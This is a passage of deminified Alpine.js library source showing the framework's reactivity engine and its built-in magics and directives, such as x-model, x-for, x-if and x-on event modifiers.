    (e, t) => e !== t && (e == e || t == t)), Rt = new WeakMap, ge = [], J = Symbol("iterate"), Mt = Symbol("Map key iterate");
    var ci = 0;
    function Vr(e) {
        let {deps: t} = e;
        if (t.length) {
            for (let r = 0; r < t.length; r++)
                t[r].delete(e);
            t.length = 0
        }
    }
    var ne = !0
      , Nt = [];
    function qr() {
        let e = Nt.pop();
        ne = void 0 === e || e
    }
    function M(e, t, r) {
        if (!ne || void 0 === I)
            return;
        let n = Rt.get(e);
        n || Rt.set(e, n = new Map);
        let i = n.get(r);
        i || n.set(r, i = new Set),
        i.has(I) || (i.add(I),
        I.deps.push(i),
        I.options.onTrack && I.options.onTrack({
            effect: I,
            target: e,
            type: t,
            key: r
        }))
    }
    function K(e, t, r, n, i, o) {
        let s = Rt.get(e);
        if (!s)
            return;
        let a = new Set
          , c = u => {
            u && u.forEach((d => {
                (d !== I || d.allowRecurse) && a.add(d)
            }
            ))
        }
        ;
        if ("clear" === t)
            s.forEach(c);
        else if ("length" === r && B(e))
            s.forEach(( (u, d) => {
                ("length" === d || d >= n) && c(u)
            }
            ));
        else
            switch (void 0 !== r && c(s.get(r)),
            t) {
            case "add":
                B(e) ? Le(r) && c(s.get("length")) : (c(s.get(J)),
                re(e) && c(s.get(Mt)));
                break;
            case "delete":
                B(e) || (c(s.get(J)),
                re(e) && c(s.get(Mt)));
                break;
            case "set":
                re(e) && c(s.get(J))
            }
        a.forEach((u => {
            u.options.onTrigger && u.options.onTrigger({
                effect: u,
                target: e,
                key: r,
                type: t,
                newValue: n,
                oldValue: i,
                oldTarget: o
            }),
            u.options.scheduler ? u.options.scheduler(u) : u()
        }
        ))
    }
    var fi = St("__proto__,__v_isRef,__isVue")
      , Ur = new Set(Object.getOwnPropertyNames(Symbol).map((e => Symbol[e])).filter($e))
      , di = je()
      , pi = je(!1, !0)
      , mi = je(!0)
      , hi = je(!0, !0)
      , Be = {};
    function je(e=!1, t=!1) {
        return function(n, i, o) {
            if ("__v_isReactive" === i)
                return !e;
            if ("__v_isReadonly" === i)
                return e;
            if ("__v_raw" === i && o === (e ? t ? gi : Gr : t ? _i : Wr).get(n))
                return n;
            let s = B(n);
            if (!e && s && he(Be, i))
                return Reflect.get(Be, i, o);
            let a = Reflect.get(n, i, o);
            return ($e(i) ? Ur.has(i) : fi(i)) || (e || M(n, "get", i),
            t) ? a : Pt(a) ? s && Le(i) ? a : a.value : _e(a) ? e ? Jr(a) : Ke(a) : a
        }
    }
    ["includes", "indexOf", "lastIndexOf"].forEach((e => {
        let t = Array.prototype[e];
        Be[e] = function(...r) {
            let n = g(this);
            for (let o = 0, s = this.length; o < s; o++)
                M(n, "get", o + "");
            let i = t.apply(n, r);
            return -1 === i || !1 === i ? t.apply(n, r.map(g)) : i
        }
    }
    )),
    ["push", "pop", "shift", "unshift", "splice"].forEach((e => {
        let t = Array.prototype[e];
        Be[e] = function(...r) {
            !function ui() {
                Nt.push(ne),
                ne = !1
            }();
            let n = t.apply(this, r);
            return qr(),
            n
        }
    }
    ));
    var xi = Yr()
      , yi = Yr(!0);
    function Yr(e=!1) {
        return function(r, n, i, o) {
            let s = r[n];
            if (!e && (i = g(i),
            s = g(s),
            !B(r) && Pt(s) && !Pt(i)))
                return s.value = i,
                !0;
            let a = B(r) && Le(n) ? Number(n) < r.length : he(r, n)
              , c = Reflect.set(r, n, i, o);
            return r === g(o) && (a ? Ct(i, s) && K(r, "set", n, i, s) : K(r, "add", n, i)),
            c
        }
    }
    var Xr = {
        get: di,
        set: xi,
        deleteProperty: function bi(e, t) {
            let r = he(e, t)
              , n = e[t]
              , i = Reflect.deleteProperty(e, t);
            return i && r && K(e, "delete", t, void 0, n),
            i
        },
        has: function vi(e, t) {
            let r = Reflect.has(e, t);
            return (!$e(t) || !Ur.has(t)) && M(e, "has", t),
            r
        },
        ownKeys: function wi(e) {
            return M(e, "iterate", B(e) ? "length" : J),
            Reflect.ownKeys(e)
        }
    }
      , Zr = {
        get: mi,
        set: (e, t) => (console.warn(`Set operation on key "${String(t)}" failed: target is readonly.`, e),
        !0),
        deleteProperty: (e, t) => (console.warn(`Delete operation on key "${String(t)}" failed: target is readonly.`, e),
        !0)
    }
      , It = (At({}, Xr, {
        get: pi,
        set: yi
    }),
    At({}, Zr, {
        get: hi
    }),
    e => _e(e) ? Ke(e) : e)
      , Dt = e => _e(e) ? Jr(e) : e
      , kt = e => e
      , ze = e => Reflect.getPrototypeOf(e);
    function Ve(e, t, r=!1, n=!1) {
        let i = g(e = e.__v_raw)
          , o = g(t);
        t !== o && !r && M(i, "get", t),
        !r && M(i, "get", o);
        let {has: s} = ze(i)
          , a = n ? kt : r ? Dt : It;
        return s.call(i, t) ? a(e.get(t)) : s.call(i, o) ? a(e.get(o)) : void (e !== i && e.get(t))
    }
    function He(e, t=!1) {
        let r = this.__v_raw
          , n = g(r)
          , i = g(e);
        return e !== i && !t && M(n, "has", e),
        !t && M(n, "has", i),
        e === i ? r.has(e) : r.has(e) || r.has(i)
    }
    function qe(e, t=!1) {
        return e = e.__v_raw,
        !t && M(g(e), "iterate", J),
        Reflect.get(e, "size", e)
    }
    function Qr(e) {
        e = g(e);
        let t = g(this);
        return ze(t).has.call(t, e) || (t.add(e),
        K(t, "add", e, e)),
        this
    }
    function tn(e, t) {
        t = g(t);
        let r = g(this)
          , {has: n, get: i} = ze(r)
          , o = n.call(r, e);
        o ? en(r, n, e) : (e = g(e),
        o = n.call(r, e));
        let s = i.call(r, e);
        return r.set(e, t),
        o ? Ct(t, s) && K(r, "set", e, t, s) : K(r, "add", e, t),
        this
    }
    function rn(e) {
        let t = g(this)
          , {has: r, get: n} = ze(t)
          , i = r.call(t, e);
        i ? en(t, r, e) : (e = g(e),
        i = r.call(t, e));
        let o = n ? n.call(t, e) : void 0
          , s = t.delete(e);
        return i && K(t, "delete", e, void 0, o),
        s
    }
    function nn() {
        let e = g(this)
          , t = 0 !== e.size
          , r = re(e) ? new Map(e) : new Set(e)
          , n = e.clear();
        return t && K(e, "clear", void 0, void 0, r),
        n
    }
    function Ue(e, t) {
        return function(n, i) {
            let o = this
              , s = o.__v_raw
              , a = g(s)
              , c = t ? kt : e ? Dt : It;
            return !e && M(a, "iterate", J),
            s.forEach(( (l, u) => n.call(i, c(l), c(u), o)))
        }
    }
    function We(e, t, r) {
        return function(...n) {
            let i = this.__v_raw
              , o = g(i)
              , s = re(o)
              , a = "entries" === e || e === Symbol.iterator && s
              , c = "keys" === e && s
              , l = i[e](...n)
              , u = r ? kt : t ? Dt : It;
            return !t && M(o, "iterate", c ? Mt : J),
            {
                next() {
                    let {value: d, done: m} = l.next();
                    return m ? {
                        value: d,
                        done: m
                    } : {
                        value: a ? [u(d[0]), u(d[1])] : u(d),
                        done: m
                    }
                },
                [Symbol.iterator]() {
                    return this
                }
            }
        }
    }
    function z(e) {
        return function(...t) {
            {
                let r = t[0] ? `on key "${t[0]}" ` : "";
                console.warn(`${Tt(e)} operation ${r}failed: target is readonly.`, g(this))
            }
            return "delete" !== e && this
        }
    }
    var on = {
        get(e) {
            return Ve(this, e)
        },
        get size() {
            return qe(this)
        },
        has: He,
        add: Qr,
        set: tn,
        delete: rn,
        clear: nn,
        forEach: Ue(!1, !1)
    }
      , sn = {
        get(e) {
            return Ve(this, e, !1, !0)
        },
        get size() {
            return qe(this)
        },
        has: He,
        add: Qr,
        set: tn,
        delete: rn,
        clear: nn,
        forEach: Ue(!1, !0)
    }
      , an = {
        get(e) {
            return Ve(this, e, !0)
        },
        get size() {
            return qe(this, !0)
        },
        has(e) {
            return He.call(this, e, !0)
        },
        add: z("add"),
        set: z("set"),
        delete: z("delete"),
        clear: z("clear"),
        forEach: Ue(!0, !1)
    }
      , cn = {
        get(e) {
            return Ve(this, e, !0, !0)
        },
        get size() {
            return qe(this, !0)
        },
        has(e) {
            return He.call(this, e, !0)
        },
        add: z("add"),
        set: z("set"),
        delete: z("delete"),
        clear: z("clear"),
        forEach: Ue(!0, !0)
    };
    function Ge(e, t) {
        let r = t ? e ? cn : sn : e ? an : on;
        return (n, i, o) => "__v_isReactive" === i ? !e : "__v_isReadonly" === i ? e : "__v_raw" === i ? n : Reflect.get(he(r, i) && i in n ? r : n, i, o)
    }
    ["keys", "values", "entries", Symbol.iterator].forEach((e => {
        on[e] = We(e, !1, !1),
        an[e] = We(e, !0, !1),
        sn[e] = We(e, !1, !0),
        cn[e] = We(e, !0, !0)
    }
    ));
    var Si = {
        get: Ge(!1, !1)
    }
      , Ai = (Ge(!1, !0),
    {
        get: Ge(!0, !1)
    });
    Ge(!0, !0);
    function en(e, t, r) {
        let n = g(r);
        if (n !== r && t.call(e, n)) {
            let i = Ot(e);
            console.warn(`Reactive ${i} contains both the raw and reactive versions of the same object${"Map" === i ? " as keys" : ""}, which can lead to inconsistencies. Avoid differentiating between the raw and reactive versions of an object and only use the reactive version if possible.`)
        }
    }
    var Wr = new WeakMap
      , _i = new WeakMap
      , Gr = new WeakMap
      , gi = new WeakMap;
    function Ke(e) {
        return e && e.__v_isReadonly ? e : ln(e, !1, Xr, Si, Wr)
    }
    function Jr(e) {
        return ln(e, !0, Zr, Ai, Gr)
    }
    function ln(e, t, r, n, i) {
        if (!_e(e))
            return console.warn(`value cannot be made reactive: ${String(e)}`),
            e;
        if (e.__v_raw && (!t || !e.__v_isReactive))
            return e;
        let o = i.get(e);
        if (o)
            return o;
        let s = function Ti(e) {
            return e.__v_skip || !Object.isExtensible(e) ? 0 : function Oi(e) {
                switch (e) {
                case "Object":
                case "Array":
                    return 1;
                case "Map":
                case "Set":
                case "WeakMap":
                case "WeakSet":
                    return 2;
                default:
                    return 0
                }
            }(Ot(e))
        }(e);
        if (0 === s)
            return e;
        let a = new Proxy(e,2 === s ? n : r);
        return i.set(e, a),
        a
    }
    function g(e) {
        return e && g(e.__v_raw) || e
    }
    function Pt(e) {
        return Boolean(e && !0 === e.__v_isRef)
    }
    y("nextTick", ( () => ee)),
    y("dispatch", (e => q.bind(q, e))),
    y("watch", ( (e, {evaluateLater: t, effect: r}) => (n, i) => {
        let a, o = t(n), s = !0, c = r(( () => o((l => {
            JSON.stringify(l),
            s ? a = l : queueMicrotask(( () => {
                i(l, a),
                a = l
            }
            )),
            s = !1
        }
        ))));
        e._x_effects.delete(c)
    }
    )),
    y("store", (function Ir() {
        return G
    }
    )),
    y("data", (e => we(e))),
    y("root", (e => U(e))),
    y("refs", (e => (e._x_refs_proxy || (e._x_refs_proxy = F(function Ci(e) {
        let t = []
          , r = e;
        for (; r; )
            r._x_refs && t.push(r._x_refs),
            r = r.parentNode;
        return t
    }(e))),
    e._x_refs_proxy)));
    var $t = {};
    function Lt(e) {
        return $t[e] || ($t[e] = 0),
        ++$t[e]
    }
    function dn(e, t, r) {
        y(t, (n => S(`You can't use [$${directiveName}] without first installing the "${e}" plugin here: https://alpinejs.dev/plugins/${r}`, n)))
    }
    y("id", (e => (t, r=null) => {
        let n = function un(e, t) {
            return Q(e, (r => {
                if (r._x_ids && r._x_ids[t])
                    return !0
            }
            ))
        }(e, t)
          , i = n ? n._x_ids[t] : Lt(t);
        return r ? `${t}-${i}-${r}` : `${t}-${i}`
    }
    )),
    y("el", (e => e)),
    dn("Focus", "focus", "focus"),
    dn("Persist", "persist", "persist"),
    p("modelable", ( (e, {expression: t}, {effect: r, evaluateLater: n, cleanup: i}) => {
        let o = n(t)
          , s = () => {
            let u;
            return o((d => u = d)),
            u
        }
          , a = n(`${t} = __placeholder`)
          , c = u => a(( () => {}
        ), {
            scope: {
                __placeholder: u
            }
        })
          , l = s();
        c(l),
        queueMicrotask(( () => {
            if (!e._x_model)
                return;
            e._x_removeModelListeners.default();
            let u = e._x_model.get
              , d = e._x_model.set
              , m = function pn({get: e, set: t}, {get: r, set: n}) {
                let o, s, a, c, i = !0, l = D(( () => {
                    let u, d;
                    i ? (u = e(),
                    n(u),
                    d = r(),
                    i = !1) : (u = e(),
                    d = r(),
                    a = JSON.stringify(u),
                    c = JSON.stringify(d),
                    a !== o ? (d = r(),
                    n(u),
                    d = u) : (t(d),
                    u = d)),
                    o = JSON.stringify(u),
                    s = JSON.stringify(d)
                }
                ));
                return () => {
                    $(l)
                }
            }({
                get: () => u(),
                set(v) {
                    d(v)
                }
            }, {
                get: () => s(),
                set(v) {
                    c(v)
                }
            });
            i(m)
        }
        ))
    }
    ));
    var Ri = document.createElement("div");
    p("teleport", ( (e, {modifiers: t, expression: r}, {cleanup: n}) => {
        "template" !== e.tagName.toLowerCase() && S("x-teleport can only be used on a <template> tag", e);
        let i = P(( () => document.querySelector(r)), ( () => Ri))();
        i || S(`Cannot find x-teleport element for selector: "${r}"`);
        let o = e.content.cloneNode(!0).firstElementChild;
        e._x_teleport = o,
        o._x_teleportBack = e,
        e._x_forwardEvents && e._x_forwardEvents.forEach((s => {
            o.addEventListener(s, (a => {
                a.stopPropagation(),
                e.dispatchEvent(new a.constructor(a.type,a))
            }
            ))
        }
        )),
        N(o, {}, e),
        h(( () => {
            t.includes("prepend") ? i.parentNode.insertBefore(o, i) : t.includes("append") ? i.parentNode.insertBefore(o, i.nextSibling) : i.appendChild(o),
            E(o),
            o._x_ignore = !0
        }
        )),
        n(( () => o.remove()))
    }
    ));
    var mn = () => {}
    ;
    function ie(e, t, r, n) {
        let i = e
          , o = c => n(c)
          , s = {}
          , a = (c, l) => u => l(c, u);
        if (r.includes("dot") && (t = function Mi(e) {
            return e.replace(/-/g, ".")
        }(t)),
        r.includes("camel") && (t = function Ni(e) {
            return e.toLowerCase().replace(/-(\w)/g, ( (t, r) => r.toUpperCase()))
        }(t)),
        r.includes("passive") && (s.passive = !0),
        r.includes("capture") && (s.capture = !0),
        r.includes("window") && (i = window),
        r.includes("document") && (i = document),
        r.includes("debounce")) {
            let c = r[r.indexOf("debounce") + 1] || "invalid-wait"
              , l = Je(c.split("ms")[0]) ? Number(c.split("ms")[0]) : 250;
            o = De(o, l)
        }
        if (r.includes("throttle")) {
            let c = r[r.indexOf("throttle") + 1] || "invalid-wait"
              , l = Je(c.split("ms")[0]) ? Number(c.split("ms")[0]) : 250;
            o = ke(o, l)
        }
        return r.includes("prevent") && (o = a(o, ( (c, l) => {
            l.preventDefault(),
            c(l)
        }
        ))),
        r.includes("stop") && (o = a(o, ( (c, l) => {
            l.stopPropagation(),
            c(l)
        }
        ))),
        r.includes("self") && (o = a(o, ( (c, l) => {
            l.target === e && c(l)
        }
        ))),
        (r.includes("away") || r.includes("outside")) && (i = document,
        o = a(o, ( (c, l) => {
            e.contains(l.target) || !1 !== l.target.isConnected && (e.offsetWidth < 1 && e.offsetHeight < 1 || !1 !== e._x_isShown && c(l))
        }
        ))),
        r.includes("once") && (o = a(o, ( (c, l) => {
            c(l),
            i.removeEventListener(t, o, s)
        }
        ))),
        o = a(o, ( (c, l) => {
            (function Pi(e) {
                return ["keydown", "keyup"].includes(e)
            }
            )(t) && function Ii(e, t) {
                let r = t.filter((o => !["window", "document", "prevent", "stop", "once", "capture"].includes(o)));
                if (r.includes("debounce")) {
                    let o = r.indexOf("debounce");
                    r.splice(o, Je((r[o + 1] || "invalid-wait").split("ms")[0]) ? 2 : 1)
                }
                if (r.includes("throttle")) {
                    let o = r.indexOf("throttle");
                    r.splice(o, Je((r[o + 1] || "invalid-wait").split("ms")[0]) ? 2 : 1)
                }
                if (0 === r.length || 1 === r.length && hn(e.key).includes(r[0]))
                    return !1;
                let i = ["ctrl", "shift", "alt", "meta", "cmd", "super"].filter((o => r.includes(o)));
                return r = r.filter((o => !i.includes(o))),
                !(i.length > 0 && i.filter((s => (("cmd" === s || "super" === s) && (s = "meta"),
                e[`${s}Key`]))).length === i.length && hn(e.key).includes(r[0]))
            }(l, r) || c(l)
        }
        )),
        i.addEventListener(t, o, s),
        () => {
            i.removeEventListener(t, o, s)
        }
    }
    function Je(e) {
        return !Array.isArray(e) && !isNaN(e)
    }
    function hn(e) {
        if (!e)
            return [];
        e = function Di(e) {
            return [" ", "_"].includes(e) ? e : e.replace(/([a-z])([A-Z])/g, "$1-$2").replace(/[_\s]/, "-").toLowerCase()
        }(e);
        let t = {
            ctrl: "control",
            slash: "/",
            space: " ",
            spacebar: " ",
            cmd: "meta",
            esc: "escape",
            up: "arrow-up",
            down: "arrow-down",
            left: "arrow-left",
            right: "arrow-right",
            period: ".",
            equal: "=",
            minus: "-",
            underscore: "_"
        };
        return t[e] = e,
        Object.keys(t).map((r => {
            if (t[r] === e)
                return r
        }
        )).filter((r => r))
    }
    function Ft(e) {
        let t = e ? parseFloat(e) : null;
        return function Li(e) {
            return !Array.isArray(e) && !isNaN(e)
        }(t) ? t : e
    }
    function _n(e) {
        return null !== e && "object" == typeof e && "function" == typeof e.get && "function" == typeof e.set
    }
    mn.inline = (e, {modifiers: t}, {cleanup: r}) => {
        t.includes("self") ? e._x_ignoreSelf = !0 : e._x_ignore = !0,
        r(( () => {
            t.includes("self") ? delete e._x_ignoreSelf : delete e._x_ignore
        }
        ))
    }
    ,
    p("ignore", mn),
    p("effect", ( (e, {expression: t}, {effect: r}) => r(x(e, t)))),
    p("model", ( (e, {modifiers: t, expression: r}, {effect: n, cleanup: i}) => {
        let o = e;
        t.includes("parent") && (o = e.parentNode);
        let a, s = x(o, r);
        a = "string" == typeof r ? x(o, `${r} = __placeholder`) : "function" == typeof r && "string" == typeof r() ? x(o, `${r()} = __placeholder`) : () => {}
        ;
        let c = () => {
            let m;
            return s((v => m = v)),
            _n(m) ? m.get() : m
        }
          , l = m => {
            let v;
            s((k => v = k)),
            _n(v) ? v.set(m) : a(( () => {}
            ), {
                scope: {
                    __placeholder: m
                }
            })
        }
        ;
        "string" == typeof r && "radio" === e.type && h(( () => {
            e.hasAttribute("name") || e.setAttribute("name", r)
        }
        ));
        var u = "select" === e.tagName.toLowerCase() || ["checkbox", "radio"].includes(e.type) || t.includes("lazy") ? "change" : "input";
        let d = te ? () => {}
        : ie(e, u, t, (m => {
            l(function ki(e, t, r, n) {
                return h(( () => {
                    if (r instanceof CustomEvent && void 0 !== r.detail)
                        return r.detail ?? r.target.value;
                    if ("checkbox" === e.type) {
                        if (Array.isArray(n)) {
                            let i = t.includes("number") ? Ft(r.target.value) : r.target.value;
                            return r.target.checked ? n.concat([i]) : n.filter((o => !function $i(e, t) {
                                return e == t
                            }(o, i)))
                        }
                        return r.target.checked
                    }
                    if ("select" === e.tagName.toLowerCase() && e.multiple)
                        return t.includes("number") ? Array.from(r.target.selectedOptions).map((i => Ft(i.value || i.text))) : Array.from(r.target.selectedOptions).map((i => i.value || i.text));
                    {
                        let i = r.target.value;
                        return t.includes("number") ? Ft(i) : t.includes("trim") ? i.trim() : i
                    }
                }
                ))
            }(e, t, m, c()))
        }
        ));
        if (t.includes("fill") && [null, ""].includes(c()) && e.dispatchEvent(new Event(u,{})),
        e._x_removeModelListeners || (e._x_removeModelListeners = {}),
        e._x_removeModelListeners.default = d,
        i(( () => e._x_removeModelListeners.default())),
        e.form) {
            let m = ie(e.form, "reset", [], (v => {
                ee(( () => e._x_model && e._x_model.set(e.value)))
            }
            ));
            i(( () => m()))
        }
        e._x_model = {
            get: () => c(),
            set(m) {
                l(m)
            }
        },
        e._x_forceModelUpdate = m => {
            void 0 === (m = void 0 === m ? c() : m) && "string" == typeof r && r.match(/\./) && (m = ""),
            window.fromModel = !0,
            h(( () => me(e, "value", m))),
            delete window.fromModel
        }
        ,
        n(( () => {
            let m = c();
            t.includes("unintrusive") && document.activeElement.isSameNode(e) || e._x_forceModelUpdate(m)
        }
        ))
    }
    )),
    p("cloak", (e => queueMicrotask(( () => h(( () => e.removeAttribute(O("cloak")))))))),
    Ne(( () => `[${O("init")}]`)),
    p("init", P(( (e, {expression: t}, {evaluate: r}) => "string" == typeof t ? !!t.trim() && r(t, {}, !1) : r(t, {}, !1)))),
    p("text", ( (e, {expression: t}, {effect: r, evaluateLater: n}) => {
        let i = n(t);
        r(( () => {
            i((o => {
                h(( () => {
                    e.textContent = o
                }
                ))
            }
            ))
        }
        ))
    }
    )),
    p("html", ( (e, {expression: t}, {effect: r, evaluateLater: n}) => {
        let i = n(t);
        r(( () => {
            i((o => {
                h(( () => {
                    e.innerHTML = o,
                    e._x_ignoreSelf = !0,
                    E(e),
                    delete e._x_ignoreSelf
                }
                ))
            }
            ))
        }
        ))
    }
    )),
    Z(Ce(":", O("bind:")));
    var gn = (e, {value: t, modifiers: r, expression: n, original: i}, {effect: o}) => {
        if (!t) {
            let a = {};
            return function $r(e) {
                return Object.entries(Dr).forEach(( ([t,r]) => {
                    Object.defineProperty(e, t, {
                        get: () => (...n) => r(...n)
                    })
                }
                )),
                e
            }(a),
            void x(e, n)((l => {
                Et(e, l, i)
            }
            ), {
                scope: a
            })
        }
        if ("key" === t)
            return function Fi(e, t) {
                e._x_keyExpression = t
            }(e, n);
        if (e._x_inlineBindings && e._x_inlineBindings[t] && e._x_inlineBindings[t].extract)
            return;
        let s = x(e, n);
        o(( () => s((a => {
            void 0 === a && "string" == typeof n && n.match(/\./) && (a = ""),
            h(( () => me(e, t, a, r)))
        }
        ))))
    }
    ;
    function xn(e, t, r, n) {
        let i = {};
        return /^\[.*\]$/.test(e.item) && Array.isArray(t) ? e.item.replace("[", "").replace("]", "").split(",").map((s => s.trim())).forEach(( (s, a) => {
            i[s] = t[a]
        }
        )) : /^\{.*\}$/.test(e.item) && !Array.isArray(t) && "object" == typeof t ? e.item.replace("{", "").replace("}", "").split(",").map((s => s.trim())).forEach((s => {
            i[s] = t[s]
        }
        )) : i[e.item] = t,
        e.index && (i[e.index] = r),
        e.collection && (i[e.collection] = n),
        i
    }
    function yn() {}
    function Ye(e, t, r) {
        p(t, (n => S(`You can't use [x-${t}] without first installing the "${e}" plugin here: https://alpinejs.dev/plugins/${r}`, n)))
    }
    gn.inline = (e, {value: t, modifiers: r, expression: n}) => {
        !t || (e._x_inlineBindings || (e._x_inlineBindings = {}),
        e._x_inlineBindings[t] = {
            expression: n,
            extract: !1
        })
    }
    ,
    p("bind", gn),
    Me(( () => `[${O("data")}]`)),
    p("data", P(( (e, {expression: t}, {cleanup: r}) => {
        t = "" === t ? "{}" : t;
        let n = {};
        ce(n, e);
        let i = {};
        !function jr(e, t) {
            return Object.entries(Lr).forEach(( ([r,n]) => {
                Object.defineProperty(e, r, {
                    get: () => (...i) => n.bind(t)(...i),
                    enumerable: !1
                })
            }
            )),
            e
        }(i, n);
        let o = R(e, t, {
            scope: i
        });
        (void 0 === o || !0 === o) && (o = {}),
        ce(o, e);
        let s = C(o);
        Ee(s);
        let a = N(e, s);
        s.init && R(e, s.init),
        r(( () => {
            s.destroy && R(e, s.destroy),
            a()
        }
        ))
    }
    ))),
    p("show", ( (e, {modifiers: t, expression: r}, {effect: n}) => {
        let i = x(e, r);
        e._x_doHide || (e._x_doHide = () => {
            h(( () => {
                e.style.setProperty("display", "none", t.includes("important") ? "important" : void 0)
            }
            ))
        }
        ),
        e._x_doShow || (e._x_doShow = () => {
            h(( () => {
                1 === e.style.length && "none" === e.style.display ? e.removeAttribute("style") : e.style.removeProperty("display")
            }
            ))
        }
        );
        let l, o = () => {
            e._x_doHide(),
            e._x_isShown = !1
        }
        , s = () => {
            e._x_doShow(),
            e._x_isShown = !0
        }
        , a = () => setTimeout(s), c = de((d => d ? s() : o()), (d => {
            "function" == typeof e._x_toggleAndCascadeWithTransitions ? e._x_toggleAndCascadeWithTransitions(e, d, s, o) : d ? a() : o()
        }
        )), u = !0;
        n(( () => i((d => {
            !u && d === l || (t.includes("immediate") && (d ? a() : o()),
            c(d),
            l = d,
            u = !1)
        }
        ))))
    }
    )),
    p("for", ( (e, {expression: t}, {effect: r, cleanup: n}) => {
        let i = function Bi(e) {
            let t = /,([^,\}\]]*)(?:,([^,\}\]]*))?$/
              , r = /^\s*\(|\)\s*$/g
              , n = /([\s\S]*?)\s+(?:in|of)\s+([\s\S]*)/
              , i = e.match(n);
            if (!i)
                return;
            let o = {};
            o.items = i[2].trim();
            let s = i[1].replace(r, "").trim()
              , a = s.match(t);
            return a ? (o.item = s.replace(t, "").trim(),
            o.index = a[1].trim(),
            a[2] && (o.collection = a[2].trim())) : o.item = s,
            o
        }(t)
          , o = x(e, i.items)
          , s = x(e, e._x_keyExpression || "index");
        e._x_prevKeys = [],
        e._x_lookup = {},
        r(( () => function ji(e, t, r, n) {
            let i = s => "object" == typeof s && !Array.isArray(s)
              , o = e;
            r((s => {
                (function Ki(e) {
                    return !Array.isArray(e) && !isNaN(e)
                }
                )(s) && s >= 0 && (s = Array.from(Array(s).keys(), (f => f + 1))),
                void 0 === s && (s = []);
                let a = e._x_lookup
                  , c = e._x_prevKeys
                  , l = []
                  , u = [];
                if (i(s))
                    s = Object.entries(s).map(( ([f,_]) => {
                        let b = xn(t, _, f, s);
                        n((w => u.push(w)), {
                            scope: {
                                index: f,
                                ...b
                            }
                        }),
                        l.push(b)
                    }
                    ));
                else
                    for (let f = 0; f < s.length; f++) {
                        let _ = xn(t, s[f], f, s);
                        n((b => u.push(b)), {
                            scope: {
                                index: f,
                                ..._
                            }
                        }),
                        l.push(_)
                    }
                let d = []
                  , m = []
                  , v = []
                  , k = [];
                for (let f = 0; f < c.length; f++) {
                    let _ = c[f];
                    -1 === u.indexOf(_) && v.push(_)
                }
                c = c.filter((f => !v.includes(f)));
                let xe = "template";
                for (let f = 0; f < u.length; f++) {
                    let _ = u[f]
                      , b = c.indexOf(_);
                    if (-1 === b)
                        c.splice(f, 0, _),
                        d.push([xe, f]);
                    else if (b !== f) {
                        let w = c.splice(f, 1)[0]
                          , A = c.splice(b - 1, 1)[0];
                        c.splice(f, 0, A),
                        c.splice(b, 0, w),
                        m.push([w, A])
                    } else
                        k.push(_);
                    xe = _
                }
                for (let f = 0; f < v.length; f++) {
                    let _ = v[f];
                    a[_]._x_effects && a[_]._x_effects.forEach(ye),
                    a[_].remove(),
                    a[_] = null,
                    delete a[_]
                }
                for (let f = 0; f < m.length; f++) {
                    let[_,b] = m[f]
                      , w = a[_]
                      , A = a[b]
                      , Y = document.createElement("div");
                    h(( () => {
                        A || S('x-for ":key" is undefined or invalid', o),
                        A.after(Y),
                        w.after(A),
                        A._x_currentIfEl && A.after(A._x_currentIfEl),
                        Y.before(w),
                        w._x_currentIfEl && w.after(w._x_currentIfEl),
                        Y.remove()
                    }
                    )),
                    A._x_refreshXForScope(l[u.indexOf(b)])
                }
                for (let f = 0; f < d.length; f++) {
                    let[_,b] = d[f]
                      , w = "template" === _ ? o : a[_];
                    w._x_currentIfEl && (w = w._x_currentIfEl);
                    let A = l[b]
                      , Y = u[b]
                      , oe = document.importNode(o.content, !0).firstElementChild
                      , Bt = C(A);
                    N(oe, Bt, o),
                    oe._x_refreshXForScope = bn => {
                        Object.entries(bn).forEach(( ([vn,wn]) => {
                            Bt[vn] = wn
                        }
                        ))
                    }
                    ,
                    h(( () => {
                        w.after(oe),
                        E(oe)
                    }
                    )),
                    "object" == typeof Y && S("x-for key cannot be an object, it must be a string or an integer", o),
                    a[Y] = oe
                }
                for (let f = 0; f < k.length; f++)
                    a[k[f]]._x_refreshXForScope(l[u.indexOf(k[f])]);
                o._x_prevKeys = u
            }
            ))
        }(e, i, o, s))),
        n(( () => {
            Object.values(e._x_lookup).forEach((a => a.remove())),
            delete e._x_prevKeys,
            delete e._x_lookup
        }
        ))
    }
    )),
    yn.inline = (e, {expression: t}, {cleanup: r}) => {
        let n = U(e);
        n._x_refs || (n._x_refs = {}),
        n._x_refs[t] = e,
        r(( () => delete n._x_refs[t]))
    }
    ,
    p("ref", yn),
    p("if", ( (e, {expression: t}, {effect: r, cleanup: n}) => {
        let i = x(e, t);
        r(( () => i((a => {
            a ? ( () => {
                if (e._x_currentIfEl)
                    return e._x_currentIfEl;
                let a = e.content.cloneNode(!0).firstElementChild;
                N(a, {}, e),
                h(( () => {
                    e.after(a),
                    E(a)
                }
                )),
                e._x_currentIfEl = a,
                e._x_undoIf = () => {
                    T(a, (c => {
                        c._x_effects && c._x_effects.forEach(ye)
                    }
                    )),
                    a.remove(),
                    delete e._x_currentIfEl
                }
            }
            )() : !e._x_undoIf || (e._x_undoIf(),
            delete e._x_undoIf)
        }
        )))),
        n(( () => e._x_undoIf && e._x_undoIf()))
    }
    )),
    p("id", ( (e, {expression: t}, {evaluate: r}) => {
        r(t).forEach((i => function fn(e, t) {
            e._x_ids || (e._x_ids = {}),
            e._x_ids[t] || (e._x_ids[t] = Lt(t))
        }(e, i)))
    }
    )),
    Z(Ce("@", O("on:"))),
    p("on", P(( (e, {value: t, modifiers: r, expression: n}, {cleanup: i}) => {
        let o = n ? x(e, n) : () => {}
        ;
        "template" === e.tagName.toLowerCase() && (e._x_forwardEvents || (e._x_forwardEvents = []),
        e._x_forwardEvents.includes(t) || e._x_forwardEvents.push(t));
        let s = ie(e, t, r, (a => {
            o(( () => {}
            ), {
                scope: {
                    $event: a
                },
                params: [a]
            })
        }
        ));
        i(( () => s()))
    }
    ))),
    Ye("Collapse", "collapse", "collapse"),
    Ye("Intersect", "intersect", "intersect"),
    Ye("Focus", "trap", "focus"),
    Ye("Mask", "mask", "mask"),
    j.setEvaluator(dt),
    j.setReactivityEngine({
        reactive: Ke,
        effect: function zr(e, t=Br) {
            (function si(e) {
                return e && !0 === e._isEffect
            }
            )(e) && (e = e.raw);
            let r = function ai(e, t) {
                let r = function() {
                    if (!r.active)
                        return e();
                    if (!ge.includes(r)) {
                        Vr(r);
                        try {
                            return function li() {
                                Nt.push(ne),
                                ne = !0
                            }(),
                            ge.push(r),
                            I = r,
                            e()
                        } finally {
                            ge.pop(),
                            qr(),
                            I = ge[ge.length - 1]
                        }
                    }
                };
                return r.id = ci++,
